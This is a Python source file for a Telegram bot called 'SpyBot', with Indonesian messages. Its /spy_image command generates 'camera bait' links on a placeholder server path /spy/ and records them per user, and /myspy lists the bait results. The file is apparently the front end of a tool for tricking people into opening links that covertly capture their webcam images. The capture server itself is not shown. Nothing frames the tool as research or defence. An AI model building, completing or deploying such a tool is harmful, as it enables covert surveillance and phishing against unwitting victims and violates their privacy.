from telegram import Update, InputFile
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
import random, string, json, os

TOKEN = "YOUR_BOT_TOKEN"
BASE_URL = "http://YOUR_SERVER_IP:5000/spy/"
DATA_FILE = "db.json"

def generate_id(length=6):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Selamat datang di SpyBot!\nGunakan /spy_image untuk buat link pancingan kamera.")

async def spy_image(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = generate_id()
    user_id = str(update.message.from_user.id)
    url = f"{BASE_URL}{uid}"

    try:
        with open(DATA_FILE, "r") as f:
            data = json.load(f)
    except:
        data = {}

    if user_id not in data:
        data[user_id] = {}
    data[user_id][uid] = {"type": "image"}

    with open(DATA_FILE, "w") as f:
        json.dump(data, f, indent=2)

    await update.message.reply_text(f"Link kamera: {url}")

async def myspy(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.message.from_user.id)
    try:
        with open(DATA_FILE, "r") as f:
            data = json.load(f)
        results = data.get(user_id, {})
        if not results:
            await update.message.reply_text("Belum ada hasil.")
            return
        msg = "Hasil pancingan kamu:\n"
        for uid in results:
            msg += f"- ID: {uid}, Type: {results[uid]['type']}\n"
        await update.message.reply_text(msg)
    except:
        await update.message.reply_text("Gagal baca data.")

app = ApplicationBuilder().token(TOKEN).build()
app.add_handler(CommandHandler("start", start))
app.add_handler(CommandHandler("spy_image", spy_image))
app.add_handler(CommandHandler("myspy", myspy))
app.run_polling()
